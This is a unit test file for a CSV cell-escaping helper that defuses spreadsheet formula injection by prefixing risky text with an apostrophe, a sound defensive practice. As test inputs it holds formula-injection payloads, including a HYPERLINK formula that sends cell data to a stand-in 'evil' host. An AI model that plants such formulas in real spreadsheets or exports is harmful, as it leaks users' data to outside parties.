import { describe, expect, it } from 'vitest';
import { csvCell } from '../src/lib/csv.js';

// #154: every CSV export neutralises spreadsheet formulas in text cells.
describe('csvCell', () => {
  it.each([
    ['=cmd', `"'=cmd"`],
    ['+1+1', `"'+1+1"`],
    ['-2+3', `"'-2+3"`],
    ['@SUM(A1)', `"'@SUM(A1)"`],
    ['\tTAB', `"'\tTAB"`],
  ])('prefixes formula text %j with an apostrophe', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('neutralises and then quotes a formula that contains quotes and commas', () => {
    expect(csvCell('=HYPERLINK("http://evil/?"&A1,"x")')).toBe(
      `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`,
    );
  });

  it('prefixes a carriage-return formula and quotes the line break', () => {
    expect(csvCell('\r=1')).toBe(`"'\r=1"`);
  });

  it('keeps plain numbers, numeric strings and booleans unchanged', () => {
    expect(csvCell(-3)).toBe('-3');
    expect(csvCell('-3.5')).toBe('-3.5');
    expect(csvCell(12n)).toBe('12');
    expect(csvCell(true)).toBe('true');
  });

  it('writes empty fields for null and undefined', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes separators, quotes and line breaks without touching ordinary text', () => {
    expect(csvCell('Rifleman')).toBe('Rifleman');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('a;b')).toBe('"a;b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });
});
